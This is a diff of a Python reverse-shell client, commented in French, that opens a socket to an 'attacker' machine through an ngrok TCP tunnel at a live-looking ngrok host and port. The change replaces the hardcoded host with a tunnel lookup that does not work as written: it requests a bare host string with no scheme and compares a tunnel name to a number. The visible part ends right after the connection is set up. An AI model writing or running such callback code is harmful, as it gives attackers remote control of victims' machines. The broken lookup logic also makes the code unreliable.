@@ -1,15 +1,24 @@
 import socket
 import subprocess
 import os
+import requests
 
-# Définissez l'adresse IP et le port de l'attaquant
-HOST = '4.tcp.eu.ngrok.io'
-PORT = 14449
+# Définissez l'adresse ngrok et le port de l'attaquant
+NGROK_URL = '0.tcp.eu.ngrok.io'
+NGROK_TUNNEL = 17886
 
 # Créez un objet socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Connectez-vous à la machine de l'attaquant
+# Récupérez l'adresse et le port ngrok
+response = requests.get(NGROK_URL)
+tunnels = response.json()['tunnels']
+for tunnel in tunnels:
+    if tunnel['name'] == NGROK_TUNNEL:
+        HOST = tunnel['public_url'].split(':')[1].replace('//', '')
+        PORT = int(tunnel['public_url'].split(':')[2])
+
+# Connectez-vous à la machine de l'attaquant via ngrok
 s.connect((HOST, PORT))
 
 # Envoyez un message à l'attaquant pour confirmer la connexion
